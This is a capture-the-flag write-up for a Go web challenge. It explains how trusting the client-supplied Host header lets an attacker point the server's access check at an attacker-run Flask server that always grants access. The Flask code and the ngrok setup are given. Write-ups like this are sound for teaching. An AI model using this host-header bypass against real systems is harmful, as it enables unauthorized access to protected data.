## Challenge Name: Access Denied
Category: Web
Points: ~950
Solves: ~17

Challenge Description: 
(insert some russian text i don't remember lmao)

Artifact Files:
* [src] (src/)

### Observations

Let's start at the beginning ! This challenge gives us some source code for a
web page talking about the SCP foundation. This is some sort of fan page
with infos about different creatures. We can find all those infos in a directory
called "secret-data" with images and descriptions.

Looking through those descriptions, one really strikes us since it contains a
redacted flag !

```
Объект №: SCP-1337

Класс объекта: ???

Объект был обнаружен в центре города ██████████. Его шелковистая шерстка и неповторимая форма оной гипнотизировал и захватывал умы человеческих осыбей.

Жертвы этого объекта обладают убедительно схожими чертами. Мужчины 17-20 лет, имеющие технический склад ума, знание и умение пользоваться современными благами человечества, таких как ██████████████, ██████████ и ██████.

После поимки одного из пострадавших все что он мог это произносить лишь одну фразу: mireactf{???}
```

So our goal would be to read this file !

Now after taking a look at the actual webserver through my webbrowser. We could see
a list of every creature referenced in the txt files which all readable except the one
with the flag which prints "Access Denied" to our screen !

Now let's make it interesting :O

### Source code vulnerability

First thing we want to do since the source code is given is of course
look at how the Access Denial is handled by the server.

After looking around a bit on how this code is structured we find that the interesting
code is in [here](./src/handlers/handlers.go). Here is the important part:

```go

func Validate(c *gin.Context) {
	// host := c.Request.Host
	data := map[string]interface{}{
		"access": false,
	}
	c.JSON(200, data)
}

func access_verification(c *gin.Context, object database.SCP) bool {
	result := map[string]interface{}{"access": false}
	response, err := http.Get("http://" + c.Request.Host + "/validate")
	if err != nil {
		return false
	}
	defer response.Body.Close()
	json.NewDecoder(response.Body).Decode(&result)
	if access, ok := result["access"].(bool); ok {
		return access
	} else {
		return false
	}
}

func GetObject(c *gin.Context) {
	object := database.GetByName(c.Param("object"))
	if object.IsSecret {
		if !access_verification(c, object) {
			c.String(200, "Access denied!!!")
			return
		}
	}
    //Blah blah
}
```

We can see the GetObject function is used to get the different SCP creatures'
informations. It's also checking a parameter called IsSecret which determines 
if it is protected by this access blocker or not.

If a privileged access is required we go on and call **access_verification**.

This makes a request to an endpoint at "/validate" which apparently as we can
see in it's handler function **Validate()** only sends out the json 
```json
{ 
    "access": false
}
```

But you'll notice something interesting. When making this request the function
uses the c.Request.Host parameter of the request which is actually linked to
the http **host** header. This means we could potentially make a request to
the SCP-1337 endpoint and pass a host header to our own webserver.

This would then make the server make a request to our fake webserver at endpoint
/validate and we could send it our own json containing

```json
{
    "access": true
}
```

And voilà !!! We could bypass the access denial and get the flag :D

### Exploitation

So in order to do this I setup a local flask server with only one endpoint at
/validate always sending a json with access true like said earlier : 

```py
#!/usr/bin/env python3

from flask import Flask

app = Flask(__name__)
app.debug = True

@app.route("/validate")
def validate():
    return '{"access": true}'

if __name__ == "__main__":
    app.run()
```

Then I used [ngrok](https://ngrok.com/) to quickly deploy my server on a publicly
accessible address. And I made a request with the host parameter set to
`host: <my_ngrok_server>.ngrok-free.app`

We can see on the logs that a request was made through our fake flask server
and looking at the http response we now have access to the secret file !

(I don't have the flag anymore cuz they shutdown the platform super quick sry)

### Reflections

This was quite a fun challenge and also very accessible with just a bit of hacker thinking.
I'm far from being the best in my team at web but still managed to solve it and get a
decent amount of points for it so i'm happy with that already :D

---
[Back to home](../../README.md)
